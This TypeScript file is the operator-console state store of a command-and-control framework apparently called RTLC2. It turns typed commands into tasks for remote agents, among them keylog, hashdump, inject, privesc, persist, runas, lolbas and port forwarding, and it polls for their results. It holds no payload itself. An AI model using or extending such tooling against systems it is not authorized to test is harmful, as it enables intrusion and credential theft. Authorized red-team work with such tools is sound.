import { create } from 'zustand';
import { api } from '../api/client';
import type { TaskRequest } from '../types';

export interface ConsoleEntry {
  id: string;
  timestamp: string;
  type: 'input' | 'output' | 'error' | 'info' | 'success';
  text: string;
}

interface AgentTaskState {
  entries: ConsoleEntry[];
  pendingTasks: Map<string, number>; // taskId -> taskType
  commandHistory: string[];
  historyIndex: number;
}

interface TaskState {
  agentTasks: Record<string, AgentTaskState>;

  addEntry: (agentId: string, entry: Omit<ConsoleEntry, 'id' | 'timestamp'>) => void;
  sendCommand: (agentId: string, command: string) => Promise<void>;
  pollPendingTasks: (agentId: string) => Promise<void>;
  getHistory: (agentId: string) => string[];
  clearConsole: (agentId: string) => void;
}

function createAgentState(): AgentTaskState {
  return { entries: [], pendingTasks: new Map(), commandHistory: [], historyIndex: -1 };
}

function timestamp(): string {
  return new Date().toLocaleTimeString('en-US', { hour12: false });
}

function uid(): string {
  return Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
}

function parseCommand(input: string): { type: number; data: string; params: Record<string, string> } | null {
  const parts = input.trim().split(/\s+/);
  const cmd = parts[0]?.toLowerCase();
  const args = parts.slice(1).join(' ');

  const cmdMap: Record<string, number> = {
    shell: 1, upload: 2, download: 3, sleep: 4, exit: 5,
    inject: 6, bof: 7, assembly: 8, screenshot: 9, keylog: 10,
    ps: 11, ls: 12, cd: 13, pwd: 14, whoami: 15,
    ipconfig: 16, hashdump: 17, token: 18, pivot: 19, portscan: 20,
    socks: 21, selfdestruct: 22, module: 23, clipboard: 24, regwrite: 25,
    service: 26, jobs: 27, persist: 28, unpersist: 29, privesc: 30,
    'file-copy': 31, 'file-move': 32, 'file-delete': 33, mkdir: 34,
    'reg-query': 35, env: 36, rportfwd: 37, runas: 38,
    powershell: 39, lolbas: 40,
  };

  const taskType = cmdMap[cmd];
  if (taskType === undefined) return null;

  const argParts = parts.slice(1);

  // Specialized parsing for new commands
  switch (taskType) {
    case 31: // FILE_COPY: file-copy <src> <dst>
    case 32: { // FILE_MOVE: file-move <src> <dst>
      const src = argParts[0] || '';
      const dst = argParts[1] || '';
      return { type: taskType, data: btoa(args), params: { src, dst } };
    }
    case 33: // FILE_DELETE: file-delete <path>
      return { type: taskType, data: btoa(argParts[0] || ''), params: { path: argParts[0] || '' } };
    case 34: { // MKDIR: mkdir <path> [--recursive]
      const hasRecursive = argParts.includes('--recursive');
      const dirPath = argParts.filter(a => a !== '--recursive').join(' ');
      return { type: taskType, data: btoa(dirPath), params: { path: dirPath, recursive: hasRecursive ? '1' : '0' } };
    }
    case 35: { // REG_QUERY: reg-query <hive> <path> [value]
      const hive = argParts[0] || '';
      const regPath = argParts[1] || '';
      const value = argParts[2] || '';
      return { type: taskType, data: btoa(args), params: { hive, path: regPath, value } };
    }
    case 36: { // ENV_VAR: env <get|set|list> [name] [value]
      const action = argParts[0] || 'list';
      const envName = argParts[1] || '';
      const envValue = argParts.slice(2).join(' ');
      return { type: taskType, data: btoa(args), params: { action, name: envName, value: envValue } };
    }
    case 37: { // RPORTFWD: rportfwd <start|stop|list> [port] [host:port]
      const rAction = argParts[0] || 'list';
      const bindPort = argParts[1] || '';
      const fwdTarget = argParts[2] || '';
      const fwdParts = fwdTarget.split(':');
      const fwdHost = fwdParts.length >= 2 ? fwdParts.slice(0, -1).join(':') : '';
      const fwdPort = fwdParts.length >= 2 ? fwdParts[fwdParts.length - 1] : '';
      return { type: taskType, data: btoa(args), params: { action: rAction, bind_port: bindPort, fwd_host: fwdHost, fwd_port: fwdPort } };
    }
    case 38: { // RUN_AS: runas <user> <password> <command>
      // Support domain\user format
      const userPart = argParts[0] || '';
      const password = argParts[1] || '';
      const runCmd = argParts.slice(2).join(' ');
      const domainSplit = userPart.split('\\');
      const domain = domainSplit.length > 1 ? domainSplit[0] : '';
      const user = domainSplit.length > 1 ? domainSplit[1] : userPart;
      return { type: taskType, data: btoa(args), params: { user, password, domain, command: runCmd } };
    }
    case 39: // POWERSHELL: powershell <script>
      return { type: taskType, data: btoa(args), params: { script: args } };
    case 40: { // LOLBAS: lolbas <binary> <args>
      const binary = argParts[0] || '';
      const lolArgs = argParts.slice(1).join(' ');
      return { type: taskType, data: btoa(args), params: { binary, args: lolArgs } };
    }
    default:
      break;
  }

  return {
    type: taskType,
    data: btoa(args),
    params: args ? { args } : {},
  };
}

export const useTaskStore = create<TaskState>((set, get) => ({
  agentTasks: {},

  addEntry: (agentId, entry) => {
    set((s) => {
      const state = s.agentTasks[agentId] || createAgentState();
      return {
        agentTasks: {
          ...s.agentTasks,
          [agentId]: {
            ...state,
            entries: [...state.entries, { ...entry, id: uid(), timestamp: timestamp() }],
          },
        },
      };
    });
  },

  sendCommand: async (agentId, command) => {
    const { addEntry } = get();
    const state = get().agentTasks[agentId] || createAgentState();

    // Add to history
    set((s) => ({
      agentTasks: {
        ...s.agentTasks,
        [agentId]: {
          ...state,
          commandHistory: [...state.commandHistory.filter((c) => c !== command), command],
          historyIndex: -1,
        },
      },
    }));

    addEntry(agentId, { type: 'input', text: `RTLC2 > ${command}` });

    if (command.trim().toLowerCase() === 'help') {
      addEntry(agentId, {
        type: 'info',
        text: 'Available commands: shell, upload, download, sleep, exit, inject, bof, assembly, screenshot, keylog, ps, ls, cd, pwd, whoami, ipconfig, hashdump, token, pivot, portscan, socks, selfdestruct, module, clipboard, regwrite, service, jobs, persist, unpersist, privesc, file-copy, file-move, file-delete, mkdir, reg-query, env, rportfwd, runas, powershell, lolbas, help, clear',
      });
      return;
    }

    if (command.trim().toLowerCase() === 'clear') {
      get().clearConsole(agentId);
      return;
    }

    const parsed = parseCommand(command);
    if (!parsed) {
      addEntry(agentId, { type: 'error', text: `Unknown command: ${command.split(' ')[0]}` });
      return;
    }

    try {
      const task: TaskRequest = {
        agent_id: agentId,
        type: parsed.type,
        data: parsed.data,
        params: parsed.params,
      };
      const res = await api.sendTask(task);
      addEntry(agentId, { type: 'info', text: `Task ${res.task_id} queued (type: ${parsed.type})` });

      // Track pending task
      set((s) => {
        const st = s.agentTasks[agentId] || createAgentState();
        const pending = new Map(st.pendingTasks);
        pending.set(res.task_id, parsed.type);
        return {
          agentTasks: { ...s.agentTasks, [agentId]: { ...st, pendingTasks: pending } },
        };
      });
    } catch (err: any) {
      addEntry(agentId, { type: 'error', text: `Failed: ${err.message}` });
    }
  },

  pollPendingTasks: async (agentId) => {
    const state = get().agentTasks[agentId];
    if (!state || state.pendingTasks.size === 0) return;

    const entries = Array.from(state.pendingTasks.entries());
    for (const [taskId] of entries) {
      try {
        const result = await api.getTaskResult(taskId);
        if (result.status >= 2) {
          // Task complete or error
          let output = '(no output)';
          if (result.output) {
            try {
              output = atob(result.output);
            } catch {
              output = result.output; // fallback: use raw value
            }
          }
          const { addEntry } = get();
          addEntry(agentId, {
            type: result.status === 2 ? 'success' : 'error',
            text: output,
          });

          // Remove from pending
          set((s) => {
            const st = s.agentTasks[agentId];
            if (!st) return s;
            const pending = new Map(st.pendingTasks);
            pending.delete(taskId);
            return {
              agentTasks: { ...s.agentTasks, [agentId]: { ...st, pendingTasks: pending } },
            };
          });
        }
        // status 0 (pending) or 1 (running) = keep polling
      } catch (err: unknown) {
        // Only log real errors, not 404 (task not found yet)
        if (err instanceof Error && !err.message.includes('404')) {
          console.warn(`[poll] Failed to get task ${taskId}:`, err);
        }
      }
    }
  },

  getHistory: (agentId) => {
    return get().agentTasks[agentId]?.commandHistory || [];
  },

  clearConsole: (agentId) => {
    set((s) => ({
      agentTasks: {
        ...s.agentTasks,
        [agentId]: { ...(s.agentTasks[agentId] || createAgentState()), entries: [] },
      },
    }));
  },
}));
